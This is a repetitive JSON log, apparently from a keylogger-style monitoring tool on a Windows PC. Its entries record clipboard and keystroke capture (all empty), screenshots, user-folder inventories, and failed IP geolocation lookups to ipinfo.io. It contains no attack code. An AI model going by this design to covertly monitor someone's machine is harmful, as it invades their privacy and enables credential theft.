{"timestamp": "2025-06-14T08:28:59.045659+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9c7210d525307caa3206dffef97c740868c48188e49334a8a1074307ab27a29e", "_raw_log_hash": "ed0071b01ab7430f49ce47988c86f97dfe5105b8aa42ad01fc0b2f2421653913"}
{"timestamp": "2025-06-14T08:29:12.600059+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "93e6b4d2e74f43342ff0683e71b3293b2adae9e3ff220e33b0cab8fdb0601a7f", "_raw_log_hash": "4dc46c1c8fe1fcf68691f96458c562b32d42e795fa10655ac78cce86940eb3dd"}
{"timestamp": "2025-06-14T08:29:26.158700+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "701a2c0599e4b07f7cfdd38fd0770f71c7336c09038536be604eda48d287e033", "_raw_log_hash": "4a9d3e7ff6d6859d11d99ae54bdd6e83b643925cbede7937d0b9db5ef8512b31"}
{"timestamp": "2025-06-14T08:29:39.712582+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "224b9ff85b3db461d0bf0d2ae1de21e38d44f4cd90b7846f0cd2106f7f5a05d8", "_raw_log_hash": "92da0ff239c88df6d460d2ff0f4ccc553d2e839a6b8a49c2913d0cfbe419cb58"}
{"timestamp": "2025-06-14T08:29:53.250873+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "22921bda9982fb9958135f885430f0ce9a67bd69c6c19bbdf2f4e6634fbfeb8b", "_raw_log_hash": "91db8b8d2616ba7cf0283b7cbe169c697c18125fc63e0374a93aa2b74d82af15"}
{"timestamp": "2025-06-14T08:30:06.801473+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ff584a733e4fe258854573c0bcc7dffe1a71dfe5411f249a739726d22c75c065", "_raw_log_hash": "da7742ee2e7f3eb6a4dac1229feb4a9e32aefbee90794032a998a24a9926efb5"}
{"timestamp": "2025-06-14T08:30:20.325584+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "cc96d63d543e95e33a8bdced32eaa73ca0717a0c013db53bb7d04b77c3aea2ce", "_raw_log_hash": "557402b5ce73875d30d59454c1ec4304835c422f1f7ef95f72b0d77f225dc102"}
{"timestamp": "2025-06-14T08:30:33.891583+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "50d02e4c662e1948790a9421ab5be536ca4320487a7d8a30d12a58b476159dfb", "_raw_log_hash": "d2daeb241775c46592f1b1e8bb6706b0e5941e02f971ae79aec60f15a7f7f1b2"}
{"timestamp": "2025-06-14T08:30:47.541488+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "215a5e7ac096e9a2679f8491f5c5676a5c3a18ecb1d86cc2a7fe40ce23137f7d", "_raw_log_hash": "7b17fcfcabf6745033140afde97add26cfd48d9cdcde14d84a46fb6518e77303"}
{"timestamp": "2025-06-14T08:31:01.127145+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5210a5eb1aa5896b45b421ee4f223dd1b2f92151b643b36394df2a16881932a3", "_raw_log_hash": "0232d0205ef7e26d02b6e41b8280dddfda41a8932fd566a770dfba0aa3c46804"}
{"timestamp": "2025-06-14T08:31:14.716773+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "934fdc705ead57786e59525e189ef3c4b7b6b8b2a5242d293199ac6a3926b45f", "_raw_log_hash": "909d455a08e37fe6b3f5f758a994393800bad48f19f16557dbb969696ab9cf12"}
{"timestamp": "2025-06-14T08:31:28.192830+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a2438f5d278f6b50a1127b1a16d49094e9b456a4063bbe7be8e22e5843c8f066", "_raw_log_hash": "bba607798f59beb0e56ad92f68e83694106ece4f920c84af6bc8c4dbe75fba9a"}
{"timestamp": "2025-06-14T08:31:41.747108+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2b2cc04cb6b4347fd501fe87518708e758f3c9834b93b55860938359d5b7529a", "_raw_log_hash": "926ae1b7ea2e9bef49f55caa0a2c5981cec94e5e6022bb24c40b9cfff65ba382"}
{"timestamp": "2025-06-14T08:31:55.275787+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "4e284fc8654b89e294d13b60cd8b4931864a8252bdc6df1f03b023ddb632f013", "_raw_log_hash": "7d27c85fdcd1b182f565b31b6f6f62ded3887b7d8790d8fed67ce05a87ce4b73"}
{"timestamp": "2025-06-14T08:32:08.802647+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "2d9dddbfad3342c7ebeb21338d85370b37c2ac7243e55e564a07ccf7fb70ee93", "_raw_log_hash": "e2859b553ab77afa6db3ad0e24ed06155504e784c1de79eae462c652ec7134ca"}
{"timestamp": "2025-06-14T08:32:22.326221+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "3471ebc03c4540747f31c7fce03d2788ce638638dd80e101ff07b2314a1d384b", "_raw_log_hash": "f339cd476e7f7e8679c366790d36ef75136514277ffb4a204fcf99285af5f6b9"}
{"timestamp": "2025-06-14T08:32:35.911225+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "41243ee2748b219f8157facccac64da3cbb9ab3d89a23e40af6620673f82348a", "_raw_log_hash": "60f667d550989a1933fd429fbecf12f194b71daa8530fd14a24239d33d594696"}
{"timestamp": "2025-06-14T08:32:49.483946+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1379D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8054691e7cac8d62778603a267bc89997986ee67097c09ac17de8503f76eaeaa", "_raw_log_hash": "9469bc0b9b498d08f092de2c8ba697ef54a25737cd75af06baa8ac50b4238a0c"}
{"timestamp": "2025-06-14T08:33:03.253839+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "044e5d7ad636e38e25547194dcbabf43533da27967e7f2642af699d91f3fc1b1", "_raw_log_hash": "46a895a4620cf7600cb8a03869e38d1f083e6e8c5159fe4d279936664cd60c03"}
{"timestamp": "2025-06-14T08:33:16.742674+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c3b6172695ef0e471544e4747ff240940c344d6692a26829c401631bfd53c411", "_raw_log_hash": "f31fdcada84c16573a50851fde0082f3bc4aa0d9e115c5c3d2bf418f85fc945d"}
{"timestamp": "2025-06-14T08:33:30.211227+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ef9e5fd05a256cef28c2021c950b1b5ecae8c8050bfe1d6b112653f471389cc0", "_raw_log_hash": "c2659eb3ac69684af3085e658d124e411c3874411c14a707c7f8ce2c88861be3"}
{"timestamp": "2025-06-14T08:33:43.723898+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d43cb4fc6af67e758d854694b6ca777c9965555394662bf592d1de456f444810", "_raw_log_hash": "beb7876357226a4d844d25450a83aa5a1e3f10f3376b5104809d29abd157301c"}
{"timestamp": "2025-06-14T08:33:57.271645+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "40d57ab317be9aca24997c056b97910b1c4b5358eab77b50bd23fe8193c819c2", "_raw_log_hash": "e592528714a5da764d60e1d869d3115a459a83e262e511907ea7328600e77436"}
{"timestamp": "2025-06-14T08:34:10.807192+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "8c1e38aff164c48924306617b14f4f0130b82c26a95e5dd181d5e92f3ad263e7", "_raw_log_hash": "ee9aa6f9a36a6b1e95306bc60c0a75eaa0ef41f0cb9fab637d7f315c8be0e220"}
{"timestamp": "2025-06-14T08:34:24.338768+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "c899eaf83d9641841461b85dd715c68546da70d24f213330d48b0501e48abe88", "_raw_log_hash": "ad927664db5bac730fe4c7edde15b664463a3021ae77d73972a386518366e983"}
{"timestamp": "2025-06-14T08:34:37.931075+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "ed9c139048d006c3961a8c731f0252bc72e712528c976d20d394178a090c0bae", "_raw_log_hash": "3f1046b29d79ebc0931f8d8e54139678ea27cb6def0e0f68c574e3cdfee6269d"}
